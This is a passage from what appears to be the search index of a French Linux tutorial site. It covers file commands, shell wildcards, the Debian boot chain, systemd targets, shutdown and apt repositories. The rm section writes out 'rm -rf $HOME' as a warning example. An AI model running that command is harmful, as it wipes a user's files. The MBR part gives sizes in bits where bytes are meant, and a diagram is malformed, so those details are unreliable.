ELF 64-bit LSB shared object [...]\n</code></pre> <pre><code>user30@deb:~$ file /dev/sda1\n/dev/sda1: block special (8/1)\n</code></pre>"},{"location":"Linux/Fichiers_Dossiers/#manipuler-les-dossiers","title":"Manipuler les dossiers","text":""},{"location":"Linux/Fichiers_Dossiers/#commande-cd","title":"commande <code>cd</code>","text":"<p>Utiliser pour ce d\u00e9plac\u00e9 dans l'arborescence Linux peut \u00eatre utilis\u00e9 aussi bien avec des chemins absolus et relatifs Elle s'utilise souvent sans option, utilis\u00e9 sans argument elle permet de revenir dans le r\u00e9pertoire personnel de l'utilisateur (\u00e9quivalent \u00e0 un $HOME ou cd ~) <code>cd -</code> permet de revenir a l'\u00e9l\u00e9ment pr\u00e9c\u00e9dent</p> <pre><code>user30@deb:~$ cd dossier01\nuser30@deb:~/dossier01$ cd $HOME\nuser30@deb:~$ cd dir02/dir03\nuser30@deb:~/dir02/dir03$ cd\nuser30@deb:~/ cd -\nuser30@deb:~/dir02/dir03$ cd ~\nuser30@deb:~$\n</code></pre>"},{"location":"Linux/Fichiers_Dossiers/#commande-mkdir","title":"commande <code>mkdir</code>","text":"<p>Permet la cr\u00e9ation de dossiers <code>mkdir</code> pour make directory</p> <code>mkdir</code> mkdirmkdir -vmkdir -p -v dir02/dir03 <p><pre><code>user30@deb:~$ mkdir dossier01\n</code></pre> Cr\u00e9ation d'un dossier sans retour de l'action</p> <p><pre><code>user30@deb:~$ mkdir -v dossier02\nmkdir: cr\u00e9ation du r\u00e9pertoire 'dossier02'\n</code></pre> Permet d'avoir un retour sur la cr\u00e9ation du dossier via la <code>-v</code></p> <p><pre><code>user30@deb:~$ mkdir -p -v dir02/dir03\nmkdir: cr\u00e9ation du r\u00e9pertoire 'dir02'\nmkdir; cr\u00e9ation du r\u00e9pertoire 'dir02/dir03'\n</code></pre> Permet la cr\u00e9ation d'un dossier et d'un sous dossier directement avec cette commande via l'option [-p]</p>"},{"location":"Linux/Fichiers_Dossiers/#commande-rmdir","title":"commande <code>rmdir</code>","text":"<p>Permet la suppression d'un dossier <code>rmdir</code> pour remove directory Ne supprime les dossiers uniquement si ceux-ci sont vides.</p> <code>rmdir</code> rmdir -vrmdir -pv dire02/dir03 <p><pre><code>user30@deb:~$ rmdir -v dossier01\nrmdir: suppression du r\u00e9pertoire, 'dossier01'\n</code></pre> Permet la suppression du 'dossier01' avec un retour de l'action r\u00e9alis\u00e9 grave a <code>-v</code></p> <p><pre><code>user30@deb:~$ rmdir -pv dir02/dir03\nrmdir: suppression du r\u00e9pertoire, 'dir02/dir03'\nrmdir: suppression du r\u00e9pertoire, 'dir02'\nuser30@deb:~$\n</code></pre> Permet la suppression d'un dossier et de son sous dossier.</p>"},{"location":"Linux/Fichiers_Dossiers/#manipulation-des-fichiers","title":"Manipulation des fichiers","text":""},{"location":"Linux/Fichiers_Dossiers/#commande-touch","title":"Commande <code>touch</code>","text":"<p>Permets de cr\u00e9er un fichier  </p> <p><code>touch &lt;nouveau_fichier&gt;</code> </p> <p>Sur un fichier existant ne l'\u00e9crasera pas, mais modifiera la date de derni\u00e8re modification du fichier</p> touch <pre><code>user30@deb:~$ ls fichier01.txt\nls: impossible d'acce\u00e9der \u00e0 'fichier01.txt': Aucun fichier ou dossier de ce type\nuser30@deb:~$ touch fichier01.txt\nuser30@deb:~$ ls -l fichier01.txt\n-rw-r--r-- 1 user30 user30 0 juil.  3 11:12 fichier01.txt\n</code></pre>"},{"location":"Linux/Fichiers_Dossiers/#commande-mv","title":"Commande <code>mv</code>","text":"<p>Permets de d\u00e9placer des fichiers ou des r\u00e9pertoires Permets \u00e9galement de renommer un fichier Fonctionne avec 2 arguments la source et la cible.  </p> <p>Options [-f -i -v -r]</p> [-f] \"force\"[-i] \"interactif\"[-v][-r] recursivit\u00e9 <p>force le d\u00e9placement du fichier Si un fichier portant le m\u00eame nom est deja pr\u00e9sent dans le dossier celui-ci sera ecras\u00e9</p> <p>au contraire de [-f] cette option demandera une confirmation avant l'\u00e9crasement d'un fichier</p> <p>affiche un message d'etat de l'action</p> <p>permet lors de copie, ou de suppression, de selectionner un dossier et tous son contenu (sous-dossier, fichier...)</p> mv <code>mv</code> d\u00e9placement sans confirmation<code>mv -iv</code> d\u00e9placement avec confirmation<code>mv -v</code> renommer un fichier <p><pre><code>user30@deb:~$ mv fichier01.txt /tmp/\nuser30@deb:~$ ls /tmp/fichier01.txt\n/tmp/fichier01.txt\n</code></pre> Cela d\u00e9place le fichier sans donner plus d'informations</p> <p><pre><code>user30@deb:~$ mv -iv fic01.txt /tmp\nmv : voulez-vous \u00e9craser '/tmp/fic01.txt' ? o\nrenomm\u00e9'fic01.txt' -&gt; '/tmp/fic01.txt'\n</code></pre> Cela demande une confirmation avant le d\u00e9placement</p> <p><pre><code>user30@deb:~$ mv -v aFaire.txt Fait.txt\nrenomm\u00e9'aFaire.txt' -&gt; 'Fait.txt'\n</code></pre> Permet de renommer un fichier  </p>"},{"location":"Linux/Fichiers_Dossiers/#commande-cp","title":"Commande <code>cp</code>","text":"<p>Permets de copier des fichiers et dossiers sous Linux. Tr\u00e8s proche de <code>mv</code> en termes de fonctionnement. Elle n\u00e9cessite a minima un fichier source en 1er argument puis le fichier cible en 2eme argument les options [-f -i -v] ayant les m\u00eames fonctionnalit\u00e9s que la commande <code>mv</code></p> <code>cp</code> Simple copieCopie d'un fichier vers un autre emplacementCopie dans un autre dossier avec un nouveau nom <pre><code>user30@deb:~$ cp -v contacts.txt contacts2.txt\n'contacts.txt' -&gt; 'contacts2.txt\"\n</code></pre> <pre><code>user30@deb:~$ cp -v contacts.txt ./dossier2/\n'contacts.txt' -&gt; './dossier2/contacts.txt'\n</code></pre> <pre><code>user30@deb:~$ cp -v contacts.txt /tmp/contacts3\n'contacts.txt' -&gt; '/tmp/contacts3'\n</code></pre> <p>il y a possibilit\u00e9 de copier plusieurs fichiers ou dossiers vers un dossier cible existant via la syntaxe</p> <p><code>cp [-p -r -v] &lt;ficsource&gt; &lt;ficsource&gt; &lt;dirsource&gt; &lt;dossiercible&gt;</code></p> <p>penser \u00e0 cr\u00e9er (ou du moins que le dossier cible soit d\u00e9j\u00e0 existant) la commande <code>cp</code> ne va pas cr\u00e9er de dossiers \u00e0 la vol\u00e9e</p> copie plusieurs fichiers <pre><code>user30@deb:~$ mkdir perso\nuser30@deb:~$ cp -rpv contacts.txt contacts-2.txt dirtest01/ perso/\ndirtest01/ perso/\n'contacts-2020.txt' -&gt; 'perso/contacts-2020.txt'\n'contacts.txt' -&gt; 'perso/contacts.txt'\n'dirtest01/' -&gt; 'perso/dirtest01'\n'dirtest01/fic1M' -&gt; 'perso/dirtest01/fic1M'\n'dirtest01/fic10M' -&gt; 'perso/dirtest01/fic10M'\ndirtest01/fic01.txt' -&gt; 'perso/dirtest01/fic01.txt'\n</code></pre> <p><code>-r</code> n\u00e9cessaire si un dossier fait partie des sources et enclenche la r\u00e9cursivit\u00e9. Cela copie l'int\u00e9gralit\u00e9 du r\u00e9pertoire (sous-dossier, fichier.). <code>-p</code> Permets de pr\u00e9server les permissions des \u00e9l\u00e9ments sources.</p>"},{"location":"Linux/Fichiers_Dossiers/#commande-rm","title":"Commande <code>rm</code>","text":"<p><code>rm [-f -i -r -v] &lt;fic1&gt; &lt;fic1&gt;</code></p> <p>Permets de supprimer des fichiers.</p> <p>La commande <code>rm</code> est destructrice, les \u00e9l\u00e9ments supprim\u00e9s ne sont pas d\u00e9plac\u00e9s dans une corbeille. les \u00e9l\u00e9ments sont r\u00e9ellement supprim\u00e9s et non r\u00e9cup\u00e9rable supprim\u00e9 un dossier et son contenu en utilisant l'option -r (en cas d'oubli de cette option, un message d'erreur sera retourn\u00e9)</p> Suppression des fichiers/dossiers Suppression de 2 fichiersSupression d'un dossier avec [-r] <pre><code>user30@deb:~$ rm -v /tmp/fichier01.txt contacts-2.txt\n'/tmp/fichier01.txt' supprim\u00e9\n'contacts-2.txt' supprim\u00e9\n</code></pre> <pre><code>user30@deb:~$ rm -rv dirtest01/\n'dirtest01/fic1M' supprim\u00e9\n'dirtest01/fic50k' supprim\u00e9\n'dirtest01/fichier01.txt' supprim\u00e9\n'dirtest01/fic100M' supprim\u00e9\n'dirtest01/fic10M' supprim\u00e9\nr\u00e9pertoire 'dirtest01/' supprim\u00e9\n</code></pre> <p> [rm -rf] </p> <p>les options [-r] &amp; [-f] utilis\u00e9es conjointement sont destructrices <code>rm -rf &lt;dossier&gt;</code> <pre><code>user30@deb:~$ rm -rf $HOME\n</code></pre> Dans cet exemple le repertoire personnel de l'utilsateur sera effac\u00e9</p>"},{"location":"Linux/Fichiers_Dossiers/#metacaracteres-and-co","title":"M\u00e9tacaract\u00e8res and Co","text":"<p>il s'agit de :</p> <ul> <li>caract\u00e8res sp\u00e9ciaux de substitution afin d'effectuer des recherches plus globales</li> <li>M\u00e9canisme important du bash</li> <li>Globalement sp\u00e9cifiques aux shells Unix/Linux</li> </ul>"},{"location":"Linux/Fichiers_Dossiers/#caracteres","title":"caracteres[*]","text":"<p>Surnomm\u00e9 wildcard, permet de r\u00e9cup\u00e9rer n'importe quel caract\u00e8re peut importe le nombre.</p> <p> Caract\u00e8res [*] </p> *.txttel* <p><pre><code>user30@deb:~$ ls *.txt\ncontacts.txt    Faits.txt    liste.txt    Tel-2020.txt\nedition1.txt    12.txt       Tel2018.txt  tel2018.txt\n</code></pre> Affiche tout les fichiers ayant comme extension .txt</p> <p><pre><code>user30@deb:~$ ls tel*\ntel2018    tel2018.txt    tel2020\n</code></pre> Ici on recup\u00e8re tout les fichiers commencant par [tel]</p>"},{"location":"Linux/Fichiers_Dossiers/#caracteres_1","title":"caract\u00e8res <code>?</code>","text":"<p>Assez proche dans son fonctionnement, on trouvera le <code>?</code>. Celui-ci indique un caract\u00e8re quelconque et un seul.</p> <p><pre><code>user30@deb:~$ ls tel20??\ntel2018    tel2020    tel20xx\n</code></pre> Dans cet exemple, on liste tous les fichiers qui commencent par tel20 et poss\u00e8dent ensuite deux caract\u00e8res quelconque.</p>"},{"location":"Linux/Fichiers_Dossiers/#caractere-et-","title":"caract\u00e8re <code>[..]</code> et <code>[..-..]</code>","text":"<p>On peut d\u00e9finir, de mani\u00e8re plus pr\u00e9cise, des listes de caract\u00e8res pouvant valider notre s\u00e9lection. On utilise les syntaxes <code>[..]</code> et <code>[..-..]</code></p> <ul> <li><code>[..]</code> indique la possibilit\u00e9 d'utiliser un caract\u00e8re parmi ceux indiqu\u00e9s.</li> <li><code>[..-..]</code> indique la possibilit\u00e9 d'utiliser un caract\u00e8re pr\u00e9sent dans un intervalle</li> </ul> chiffresCaract\u00e8resM\u00e9lange chiffre caract\u00e8res <p><pre><code>user30@deb:~$ ls tel20[12][0-9]\ntel2018    tel2020\n</code></pre> Le premier choix [12] indique le choix entre le chiffre 1 ou le chiffre 2 La deuxieme partie [0-9] indique un caract\u00e8re entre 0 et 9.</p> <p><pre><code>user30@deb:~$ ls [tT][a-zA-Z]*\ntel2018    Tel2018    tel2020    Tel-2020.txt    toto    tel20xx\n</code></pre> Ici on donne le choix entre <code>t</code> miniscule ou <code>T</code> majuscule [tT]. Ensuite [a-zA-Z] pr\u00e9cise que l'on veut une lettre minuscule ou majuscule. Enfin [*] permet d'indiquer n'importe quel caract\u00e8re \u00e0 suivre, ou aucun.</p> <p><pre><code>user30@deb:~$ ls [tT]*[0-9][0-9]\ntel2018    tel2020    Tel2018\n</code></pre> Ici on souhaite un fichier commencant par la lettre Minuscule ou Majuscule N'importe quelle caract\u00e8re entre les deux Mais cela doit obligatoirement ce finir par 2 chiffres  </p> <p>Si le caract\u00e8re <code>^</code> ou <code>!</code> est ajout\u00e9 au crochet</p> <ul> <li>[^.] / [^.-..]</li> <li>[!.] / [!.-..]</li> </ul> <p>Il sera possible d'inverser la s\u00e9lection. Dans ce cas, il sera demand\u00e9 d'afficher tous les fichiers et dossiers ne commen\u00e7ant pas par la lettre <code>t</code></p>"},{"location":"Linux/Fichiers_Dossiers/#autres-caracteres","title":"autres caract\u00e8res","text":"<p>Le bash permet \u00e9galement l'utilisation d'autres caract\u00e8res sp\u00e9ciaux avec les utilisations suivantes :</p> symbole nom Description ' ' Simples quotes Banalise tous les caract\u00e8res situ\u00e9s entre les quotes \" \" Doubles quotes Banalise tous *SAUF $,  et `(Backquote) $ Dollar Il permet d'afficher le contenu d'une variable \\ Antislash Il banalise le caract\u00e8re qui le suit ($, *, ?..) et permet de l'afficher dans l'interpreter $(..) Dollar parenth\u00e8se R\u00e9cup\u00e9rer le r\u00e9sultat de la commande entre parenth\u00e8se, par exemple dans une variable ` Backquotes M\u00eame r\u00e9sultat que ci-dessus, mais syntaxe d\u00e9pr\u00e9ci\u00e9e"},{"location":"Linux/Fichiers_Dossiers/#facteurs-doccurrence","title":"Facteurs d'occurrence","text":"<p>Les facteurs d'occurrence permettent de d\u00e9finir le nombre de fois ou une recherche est effectu\u00e9e.  </p> <ul> <li>?(..) 0 \u00e0 1 fois : optionnel une seule fois</li> <li>*(.) 0 \u00e0 n fois : optionnel illimit\u00e9 en nombre </li> <li>+(.) 1 \u00e0 n fois : au moins une fois</li> <li>@(.) 1 fois : exactement une fois</li> <li>!(..) l'expression entre parenth\u00e8ses ne sera pas pr\u00e9sente  </li> </ul> <p><pre><code>user30@deb:~$ ls -d +([eE])*\nEdition    edition1.txt    eedition    Eedition    eeeeexemple\n</code></pre> La recherche +([eE]) indique que l'on veut au moins une fois le caract\u00e8re e en majuscule ou en minuscule Completer avec * pour lister tous les fichiers commen\u00e7ant par un e</p> <p><pre><code>user30@deb:~$ ls -d !(*.txt)\ncontacts2020    dirtest01    Edition    eedition    Eedition\neeeeexemple     newcontacts  perso      tel2018     tel2020    toto\n</code></pre> La recherche !(*.txt) indique tous les fichiers sauf ceux se terminant par l'extension txt.</p> <p>N. B. L'option du shell <code>extglob</code> doit \u00eatre activ\u00e9e. Cela se fait et v\u00e9rifie avec la commande shopt</p> <p>shopt</p> <pre><code>user30@deb:~$ shopt -s extglob\nuser30@deb:~$ shopt\n[...]\nextglob on\n[...]\n</code></pre> <p>Possibilit\u00e9 d'utiliser les accolades {} pour offrir un choix parmi plusieurs possibilit\u00e9s. Par exemple pour rechercher plusieurs extensions de fichiers \u00e0 la fois. Cette syntaxe ne se limite pas \u00e0 la recherche.  </p>  {}  RechercheCr\u00e9ation de r\u00e9pertoire <pre><code>user30@deb:~$ls images/*.{jpeg,gif,png}\nimages/icon1.gif    images/icon2.gif    images/logo.png\nimages/wallp.jpeg\n</code></pre> <pre><code>user30@deb:~$ mkdir -v {image,video}\nmkdir: cr\u00e9ation du r\u00e9pertoire 'images'\nmkdir: cr\u00e9ation du r\u00e9pertoire 'video'\n</code></pre>"},{"location":"Linux/Gestion_debian/","title":"Utiliser une distribution Linux","text":"<p>Objectif\u00a0: Comprendre les diverses \u00e9tapes de d\u00e9marrage Apprendre \u00e0 g\u00e9rer le syst\u00e8me et les services avec systemD Arr\u00eater ou red\u00e9marrer un syst\u00e8me d\u2019exploitation Linux</p>"},{"location":"Linux/Gestion_debian/#demarrage-de-linux-services-et-niveaux","title":"D\u00e9marrage de Linux, services et niveaux","text":"<pre>\n    graph LR\n    A[BIOS] --&gt; B[\"MBR \n    Boot Primaire\"];\n    B --&gt; C[GRUB];\n    C --&gt; D[Noyau];\n    D --&gt; E[SystemD];\n    E --&gt; F[Cible];\n</pre> <p>Sous Debian, le chargeur est le programme\u00a0GRUB2. Il se divise en plusieurs parties nomm\u00e9es stage.  </p>"},{"location":"Linux/Gestion_debian/#bios","title":"BIOS","text":"<pre>\n    graph LR\n    A[Bios]\n</pre> <ul> <li>BIOS = Basic Input/Output system: syst\u00e8me \u00e9l\u00e9mentaire d\u2019entr\u00e9e/sortie. C\u2019est un ensemble de fonctions contenu dans la m\u00e9moire morte (ROM) de la carte m\u00e8re d\u2019un ordinateur lui permettant d\u2019effectuer des op\u00e9rations \u00e9l\u00e9mentaires lors de sa mise sous tension.</li> <li>Ex\u00e9cute des op\u00e9rations de v\u00e9rification de l\u2019int\u00e9grit\u00e9 du syst\u00e8me.</li> <li>Cherche, charge et ex\u00e9cute le programme d\u2019amor\u00e7age.</li> <li>Il cherche le programme d\u2019amor\u00e7age sur un disque dur, une disquette, un CD-Rom ou une cl\u00e9 USB.</li> <li>Une fois le programme d\u2019amor\u00e7age trouv\u00e9 et charg\u00e9 en m\u00e9moire, le BIOS lui donne le contr\u00f4le.</li> <li>Simplement, le BIOS ex\u00e9cute la MBR.</li> </ul>"},{"location":"Linux/Gestion_debian/#mbr-master-boot-record-stage-1","title":"MBR (Master Boot Record) = Stage\u00a01","text":"<pre>\ngraph LR\n A[BIOS] --&gt; B[MBR];\n</pre> MBR <p>Il s'agit du Boot Primaire, sa taille \u00e9tant limit\u00e9 \u00e0 512 octets, il n'a pour fonction que de lancer le boot secondaire qui occupe un plus gros espace aillerus sur le disque.</p> <ul> <li>C\u2019est le premier secteur adressable d\u2019un disque dur. Le plus souvent appel\u00e9 /dev/hda ou /dev/sda.</li> <li> <p>La taille de cette zone est de 512\u00a0bits au maximum. Elle contient\u00a0:</p> <ol> <li>le programme d\u2019amor\u00e7age se trouve dans les 446\u00a0premiers bits.</li> <li>la table des partitions (les 4\u00a0partitions primaires) du disque dur sur les 64\u00a0bits suivants.</li> <li>v\u00e9rification de la validit\u00e9 du MBR dans les 2\u00a0derniers bits.</li> </ol> </li> <li> <p>Il contient une routine d\u2019amor\u00e7age dont le but est de charger le syst\u00e8me d\u2019exploitation (ou le \u00ab boot loader \u00bb/chargeur d\u2019amor\u00e7age s\u2019il existe - GRUB ou LiLo) pr\u00e9sent sur la partition active.</p> </li> <li>Simplement, le MBR ex\u00e9cute le programme d\u2019amor\u00e7age GRUB.</li> </ul>"},{"location":"Linux/Gestion_debian/#grub-grand-unified-bootloader","title":"GRUB (GRand Unified Bootloader)","text":"<pre><code>graph LR\n A[BIOS] --&gt; B[MBR];\n B --&gt; C[GRUB];\n</code></pre> <p>GRUB</p> <p>\u00a1 IL NE FAUT PAS \u00c9DITER CE FICHIER !  </p> <ul> <li>Lorsque le micro-ordinateur h\u00e9berge plusieurs syst\u00e8mes (on parle alors de multiamor\u00e7age), il permet \u00e0 l\u2019utilisateur de choisir quel syst\u00e8me d\u00e9marrer.</li> <li>Il pr\u00e9sente une interface qui permet \u00e0 l\u2019utilisateur de choisir quel syst\u00e8me d\u2019exploitation d\u00e9marrer.</li> <li>Si vous avez plus d\u2019un noyau install\u00e9 sur votre syst\u00e8me, il est possible de s\u00e9lectionner celui que vous voulez ex\u00e9cuter.</li> <li>Il conna\u00eet le syst\u00e8me de fichiers (ext3, ext4, Btrfs, etc.) utilis\u00e9 sur le syst\u00e8me.</li> <li>Simplement, GRUB charge et ex\u00e9cute le noyau s\u00e9lectionn\u00e9 et l\u2019image initrd (image d\u2019un syst\u00e8me minimal initialis\u00e9 au d\u00e9marrage du syst\u00e8me = Initial Ram Disk).  </li> </ul> <p>Le fichier de configuration de grub se trouve dans /boot/grub/grub.cfg Il est conseill\u00e9 de proc\u00e9der aux modifications de la configuration de GRUB \u00e0 partir de\u00a0:  </p> <ul> <li>/etc/default/grub, contenant les param\u00e8tres et options globales  </li> <li>scripts pr\u00e9sents dans le dossier /etc/grub.d/</li> </ul> <p>Pour la prise en compte de ces modifications, deux commandes permettent de r\u00e9g\u00e9n\u00e9rer le fichier /boot/grub/grub.cfg grub-mkconfig &amp; update-grub </p> <pre><code>root@deb:~# update-grub\nCr\u00e9ation du fichier de configuration GRUB...\nImage Linux trouv\u00e9e : /boot/vmlinuz-4.19.0-12-amd64\nImage m\u00e9moire initiale trouv\u00e9e : /boot/initrd.img-4.19.0.12-amd64\nImage Linux trouv\u00e9e : /boot/vmlinuz-4.19.0-11-amd64\nImage m\u00e9moire initiale trouv\u00e9e : /boot/initrd.img-4.19.0-11amd64\nfait\n</code></pre>"},{"location":"Linux/Gestion_debian/#le-noyau","title":"Le Noyau","text":"<pre><code>graph LR\n A[BIOS] --&gt; B[\"MBR]; \n Boot Primaire\"];\n B --&gt; C[GRUB];\n C --&gt; D[Noyau];\n</code></pre> <ul> <li>Monte le syst\u00e8me de fichiers racines (\u00ab root \u00bb). Donc, relie une partition ou un p\u00e9riph\u00e9rique \u00e0 un r\u00e9pertoire, r\u00e9pertoire par lequel les donn\u00e9es pr\u00e9sentes sur la partition ou le p\u00e9riph\u00e9rique sont accessibles.</li> <li>Il met en relation la partie mat\u00e9rielle (carte \u00e9lectronique.) avec les interfaces utilisateur (p\u00e9riph\u00e9rique, application\u2026)</li> <li>Le noyau charge et ex\u00e9cute le programme /sbin/init.</li> <li>Comme le programme init est le premier programme a \u00eatre ex\u00e9cut\u00e9 par le noyau Linux, il porte le PID (ID du processus) num\u00e9ro\u00a01.</li> <li>Le initrd permet ainsi d\u2019avoir un syst\u00e8me minimal pouvant ensuite charger le syst\u00e8me de fichier principal ou bien des syst\u00e8mes sans disques. Il peut \u00eatre instable d\u2019avoir \u00ab\u00a0en dur\u00a0\u00bb dans le kernel tous les drivers de disques. Pour \u00e9viter cela, les distributions compilent un kernel minimal avec les options de bases puis chargent les modules obligatoires n\u00e9cessaires contenus dans l\u2019archive de l\u2019initrd.</li> <li>Le Noyau est dit modulaire, car il est constitu\u00e9 de plusieurs fichiers.</li> <li>Parmi cela, 2 sont indispensables au d\u00e9marrage d\u2019un OS Debian<ul> <li>vmlinuz-[version_du_fichier]-amd64\u00a0: fichier principal du noyau avec sa version dans le nom</li> <li>initrd.img-[version_du_fichier]-amd64\u00a0: fichier secondaire g\u00e9n\u00e9r\u00e9 \u00e0 chaque mise \u00e0 jour. Il contient la configuration sp\u00e9cifique au mat\u00e9riel et les options importantes de syst\u00e8mes d\u2019exploitation (ex.\u00a0: gestion du raid, chiffrement, pilote des syst\u00e8mes de fichiers, etc.)  </li> </ul> </li> </ul> <pre><code>root@deb:~# ls -l /boot/\ntotal 72280\n-rw-r--r-- 1 root root  206143 oct.   18 10:43 config-4.19.0.12-amd64\ndrwxr-xr-x 5 root root    4096 nov.   19 12:00 grub\n...\n</code></pre> <p>Lors du d\u00e9marrage, il est possible d\u2019acc\u00e9der au param\u00e8tre de lancement du noyau via le GRUB. Pour cela, il suffit de presser la touche \u00ab\u00a0e\u00a0\u00bb pour passer en mode \u00e9dition puis de chercher la ligne  </p> <p><code>linux /vmlinuz-[version_du_fichier] root=/dev/mapper/debian--vg-root ro quiet</code></p> <ul> <li>/vmlinuz-[version_du_fichier]\u00a0: nom de l\u2019image noyau \u00e0 charger.</li> <li>root=/dev/mapper/debian--vg-root: d\u00e9claration du syst\u00e8me de fichier contenant la racine du syst\u00e8me d\u2019exploitation (/)</li> <li>ro\u00a0: indique que la racine du syst\u00e8me d\u2019exploitation sera mont\u00e9e en lecture seule. Il est important de ne pas changer ce param\u00e8tre (si l\u2019int\u00e9grit\u00e9 du syst\u00e8me de fichier doit \u00eatre v\u00e9rifi\u00e9e, celui-ci doit \u00eatre en lecture seule).</li> <li>quiet\u00a0: indique que le noyau se lancera de fa\u00e7on non verbeuse.</li> </ul>"},{"location":"Linux/Gestion_debian/#systemd","title":"SystemD","text":"<pre><code>graph LR\n A[BIOS] --&gt; B[\"MBR \n Boot Primaire\"];\n B --&gt; C[GRUB];\n C --&gt; D[Noyau];\n D --&gt; E[SystemD];\n</code></pre> <p>SystemeD est le gestionnaire syst\u00e8me, le premier programme lanc\u00e9 par le noyau (PID1). Il est en charge de lancer tous les programmes suivants afin d\u2019obtenir un syst\u00e8me op\u00e9rationnel pour l\u2019utilisateur. Le d\u00e9marrage des programmes (services) est parall\u00e8le avec des d\u00e9pendances entre services. La gestion des services est mat\u00e9rialis\u00e9e dans des fichiers sp\u00e9cifiques au sein du dossier  <code>/lib/systemd/system</code>.  </p> <p>SystemD utilise des cibles (target) pour savoir quels sont les programmes \u00e0 ex\u00e9cuter ou arr\u00eater suivant l\u2019objet de la cible. Il utilise 6\u00a0cibles pour savoir quels sont les programmes a d\u00e9marr\u00e9 ou arr\u00eater suivant l\u2019int\u00e9r\u00eat de la cible en question sous Debian la cible graphical.target est la cible par d\u00e9faut (qu\u2019elle soit install\u00e9e ou non).  </p> Nom de la cible Objet de la cible Equiv. SysV poweroff.target Arr\u00eat du syst\u00e8me 0 rescue.target Passer en mode maintenance 1 multi-user.target Syst\u00e8me d\u2019exploitation en mode\u00a0CLI avec session multi-utilisateur 3 graphical.target Syst\u00e8me d\u2019exploitation en mode GUI si install\u00e9 5 reboot.target Red\u00e9marrage du syst\u00e8me 6 <p>la commande <code>systemctl</code>est d\u00e9taill\u00e9e dans la page\u00a0: commande bash </p>"},{"location":"Linux/Gestion_debian/#gestion-des-services","title":"Gestion des services","text":"<p>La gestion des services fait \u00e9galement appel \u00e0 la commande <code>systemctl</code> commande bash </p>"},{"location":"Linux/Gestion_debian/#arreter-redemarrer-le-systeme","title":"Arr\u00eater / Red\u00e9marrer le Syst\u00e8me","text":"<p>Pour arr\u00eater le syst\u00e8me, il faudra passer par la commande <code>shutdown</code> </p> <p><code>shutdown [-r -h c] &lt;heure&gt; &lt;message&gt;</code></p> option description <code>-r</code> permets de programmer un red\u00e9marrage <code>-h</code> permets de programmer l\u2019arr\u00eat du syst\u00e8me <code>-c</code> Annule une commande shutdown en attente exemple d\u2019arr\u00eat du syst\u00e8me arret imm\u00e9diatarret diff\u00e9r\u00e9 <pre><code>root@deb:~# shutdown -h now\n</code></pre> <pre><code>root@deb:~# shutdown -h +10 \"Arr\u00eat du serveur dans 10min !\"\n</code></pre> exemple de red\u00e9marrage du syst\u00e8me Red\u00e9marrage imm\u00e9diatRed\u00e9marrage du syst\u00e8me pour 16h30 <p><pre><code>root@deb:~# reboot\n</code></pre> ou <pre><code>root@deb:~# shutdown -r now\n</code></pre></p> <pre><code>root@deb:~# shutdown -r 16:30 \"reboot \u00e0 16h30\"\n</code></pre> annuler un shutdown <p><pre><code>root@deb:~# shutdown -c\n</code></pre> Ne fonctionne pas avec l'option <code>now</code> ou une fois l'heure programm\u00e9e atteinte.</p>"},{"location":"Linux/Gestion_paquets_logiciel/","title":"Gestion des paquets","text":""},{"location":"Linux/Gestion_paquets_logiciel/#gestion-des-depots","title":"Gestion des d\u00e9p\u00f4ts","text":"<p>Les paquets logiciels, et leurs sources, sont disponibles sur internet dans des repository (des d\u00e9p\u00f4ts similaires aux \u00ab\u00a0stores\u00a0\u00bb Android, iOS, etc.) Lorsqu\u2019une machine est install\u00e9e, les d\u00e9p\u00f4ts officiels Debian sont configur\u00e9s automatiquement, cela facilite\u00a0:  </p> <ul> <li>La mise \u00e0 jour de toute la distribution, pouvant \u00eatre\u00a0:</li> <li>mise \u00e0 jour de s&amp;curit\u00e9</li> <li>mise \u00e0 jour compl\u00e8te du syst\u00e8me et des paquets</li> <li>l\u2019installation de nouveaux paquets\u00a0:  </li> <li>Il n\u2019est pas n\u00e9cessaire de faire des recherches sur internet, le gestionnaire de paquets se charge de les trouver</li> </ul> <p>Le fichier /etc/apt/sources.list contient la configuration des d\u00e9p\u00f4ts.  </p> <pre><code>root@deb:~# vim /etc/apt/sources.list\n#deb cdrom:[Debian GNU/Linux 10.0 Buster Official amd64 NETINST ]/ buster main\n# d\u00e9pot de base de la distribution\ndeb http://ftp.fr.debian.org/debian/buster main\ndeb-src http://ftp.fr.debian.org/debian/buster main\n# security updates - mise \u00e0\u00a0 jours de s\u00e9curit\u00e9\ndeb http://security.debian.org/buster/updates main\ndeb-src http://security.debian.org/buster/updates main\n# buster-updates, previously known as 'volatile'\ndeb http://ftp.fr.debian.org/debian/ buster-updates main deb-src http://ftp.fr.debian.org/debian/ buster-updates main\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#fichier-sourceslist","title":"fichier sources.list","text":"<p><code>deb http://ftp.fr.debian.org/debian/ buster main contrib</code></p> <p>le premier champ indique le type de paquet\u00a0:  </p> <ul> <li>deb\u00a0: paquet binaire</li> <li>deb-src\u00a0: paquet source</li> </ul> <p>Le deuxi\u00e8me champ indique le type et le chemin de la source. il peut commencer par\u00a0:  </p> <ul> <li>http://\u00a0: site web de t\u00e9l\u00e9chargement\u00a0;</li> <li>ftp://: site FTP de t\u00e9l\u00e9chargement\u00a0;</li> <li>file://\u00a0: r\u00e9pertoire local\u00a0;</li> <li>cdrom:[\u2026]\u00a0: suivi entre crochets du label du CD, indique un CD-ROM ou DVD-ROM</li> </ul> <p>le Troisi\u00e8me champ sp\u00e9cifie la branche disponible\u00a0:  </p> <ul> <li>oldstable\u00a0: l\u2019ancienne version stable</li> <li>stable\u00a0: la version officielle actuelle</li> <li>buster: une version sp\u00e9cifique, cela peut \u00eatre la version officielle</li> <li>testing: la prochaine version stable</li> <li>unstable: version portant toujours le nom de Sid</li> <li>experimental: il est pr\u00e9f\u00e9rable de la laisser aux d\u00e9veloppeurs</li> </ul> <p>Le quatri\u00e8me champ et les suivants indiquent la section, dont l\u2019objectif est de filtrer les paquets \u00e0 installer\u00a0:  </p> <ul> <li>main\u00a0: les paquets Debian standards, ils sont tous libres</li> <li>contrib\u00a0: ces paquets sont libres, mais d\u00e9pendants de paquets qui ne le sont pas, ils pr\u00e9sentent donc une d\u00e9pendance vers non-free</li> <li>non free\u00a0: des paquets sous licence non libre</li> </ul> <p>Il est possible d\u2019utiliser des fichiers sources ind\u00e9pendants d\u00e9pos\u00e9s dans le dossier /,etc/apt/sources.list.d</p>"},{"location":"Linux/Gestion_paquets_logiciel/#gestion-des-paquets_1","title":"Gestion des paquets","text":"<p>Les diff\u00e9rentes op\u00e9rations de gestion des paquets seront r\u00e9alis\u00e9es avec deux outils\u00a0: <code>apt-get</code> / <code>apt-cache</code> et 